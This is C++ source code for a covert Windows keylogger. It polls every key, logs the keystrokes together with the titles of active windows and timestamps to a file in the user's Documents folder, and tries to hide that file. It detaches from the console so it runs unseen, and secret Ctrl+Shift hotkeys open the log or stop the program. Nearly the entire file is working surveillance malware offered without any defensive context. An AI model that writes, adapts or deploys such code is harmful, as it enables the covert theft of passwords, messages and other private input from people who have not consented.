#include <iostream>
#include <windows.h>
#include <ctime>
#include <cstring>
#include <string>

using namespace std;

string prev_window(256, '\0');

string curr_window(256, '\0');
int capsFlag = 0;
int shift = 0;

void log(int vkey, const string& filename)
{
    string fpath = getenv("USERPROFILE");
    string path = fpath + "\\Documents\\" + filename;

    // Check if the file exists, and create it if it doesn't
    FILE* file = fopen(path.c_str(), "a");
    if (file == NULL) {
        cerr << "Error creating or opening file: " << path << endl;
        return;
    }

    // Set file attributes to hidden
    DWORD fileAttributes = GetFileAttributesA(path.c_str());
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    HWND windowHandler = GetForegroundWindow();
    GetWindowTextA(windowHandler, curr_window.data(), 256);

    if (prev_window != curr_window) {
        time_t current_time = time(NULL);
        char* dt = ctime(&current_time);
        fprintf(file, "\n\n%s\t\t%s", curr_window.c_str(), dt);
        strcpy(prev_window.data(), curr_window.c_str());
    }

    if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
        (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
        (GetAsyncKeyState('G') & 0x8000)) {
        ShellExecute(0, "open", path.c_str(), 0, 0, SW_SHOW);
    }

    if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
        (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
        (GetAsyncKeyState('Q') & 0x8000)) {
        fclose(file);
        exit(0);
    }

    string specialChars[] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")" };

    char key = static_cast<char>(vkey);

    shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 1 : 0;

    if (vkey == VK_CAPITAL) {
        capsFlag = (capsFlag + 1) % 2;
    }

    int isCaps = capsFlag ^ shift;

    if (isdigit(key)) {
        if (shift) {
            fprintf(file, "%s", specialChars[key - '0'].c_str());
        } else {
            fprintf(file, "%c", key);
        }
    } else if (isalpha(key)) {
        if (isCaps) {
            fprintf(file, "%c", key);
        } else {
            key = static_cast<char>(vkey + 32);
            fprintf(file, "%c", key);
        }
    } else {
        switch (vkey) {
            case VK_SPACE: fprintf(file, " "); break;
            case VK_RETURN: fprintf(file, "\n[ENTER]\n"); break;
            case VK_BACK: fprintf(file, "[BACKSPACE]"); break;
            case VK_TAB: fprintf(file, "[TAB]"); break;
            case VK_OEM_MINUS: fprintf(file, "%c", shift ? '_' : '-'); break;
            case VK_OEM_PLUS: fprintf(file, "%c", shift ? '+' : '='); break;
            case VK_OEM_4: fprintf(file, "%c", shift ? '{' : '['); break;
            case VK_OEM_6: fprintf(file, "%c", shift ? '}' : ']'); break;
            case VK_OEM_5: fprintf(file, "%c", shift ? '|' : '\\'); break;
            case VK_OEM_1: fprintf(file, "%c", shift ? ':' : ';'); break;
            case VK_OEM_7: fprintf(file, "%c", shift ? '\"' : '\''); break;
            case VK_OEM_COMMA: fprintf(file, "%c", shift ? '<' : ','); break;
            case VK_OEM_PERIOD: fprintf(file, "%c", shift ? '>' : '.'); break;
            case VK_OEM_2: fprintf(file, "%c", shift ? '?' : '/'); break;
            case VK_OEM_3: fprintf(file, "%c", shift ? '~' : '`'); break;
            default: break; // Handle other keys if necessary
        }
    }
    fclose(file);
}

int main()
{
    FreeConsole(); // Detaches the program from usign the console

    while (true) {
        Sleep(10);

        for (int i = 0; i < 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                log(i, "Keystrokes.txt");
            }
        }
    }
    return 0;
}
